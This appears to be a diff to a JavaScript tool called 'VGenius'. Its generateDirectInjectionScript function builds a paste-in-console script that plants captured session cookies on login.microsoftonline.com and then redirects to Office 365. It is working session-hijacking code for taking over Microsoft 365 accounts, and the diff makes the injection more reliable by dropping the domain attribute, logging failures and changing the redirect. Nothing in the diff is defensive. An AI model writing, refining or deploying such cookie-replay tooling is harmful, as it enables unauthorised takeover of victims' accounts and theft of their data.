@@ -502,26 +502,36 @@ function generateDirectInjectionScript(cookies, prtScript) {
   }
 
   var output = '// VGenius Cookie Injection Script\n';
-  output += '// Run this on https://login.microsoftonline.com\n';
+  output += '// PASTE THIS IN CONSOLE ON https://login.microsoftonline.com\n';
   output += '(function() {\n';
+  output += '  "use strict";\n';
   output += '  var injected = 0;\n';
+  output += '  var failed = 0;\n';
   output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
   output += '\n';
-  output += '  // Set all cookies for login.microsoftonline.com domain\n';
+  output += '  console.log("[VGenius] Starting cookie injection... " + cookies.length + " cookies");\n';
+  output += '\n';
+  output += '  // Set all cookies - first without domain (current page), then with domain\n';
   output += '  for (var i = 0; i < cookies.length; i++) {\n';
   output += '    var c = cookies[i];\n';
   output += '    try {\n';
-  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=" + c.domain + "; path=/; Secure; SameSite=None";\n';
+  output += '      // Set without domain attribute (works for current domain)\n';
+  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; path=/; Secure; SameSite=None";\n';
   output += '      injected++;\n';
-  output += '    } catch(e) {}\n';
+  output += '      console.log("[VGenius] Set: " + c.name + " (domain: " + c.domain + ")");\n';
+  output += '    } catch(e) {\n';
+  output += '      failed++;\n';
+  output += '      console.error("[VGenius] Failed: " + c.name, e);\n';
+  output += '    }\n';
   output += '  }\n';
   output += '\n';
-  output += '  console.log("[VGenius] Injected " + injected + " cookies");\n';
+  output += '  console.log("[VGenius] Successfully injected " + injected + "/" + cookies.length + " cookies");\n';
   output += '\n';
-  output += '  // Wait 1.5s then redirect to trigger SSO\n';
+  output += '  // Wait 2s then redirect to trigger SSO\n';
   output += '  setTimeout(function() {\n';
-  output += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  output += '  }, 1500);\n';
+  output += '    console.log("[VGenius] Redirecting to Office 365...");\n';
+  output += '    window.location.href = "https://www.office.com/";\n';
+  output += '  }, 2000);\n';
   output += '})();\n';
 
   return output;
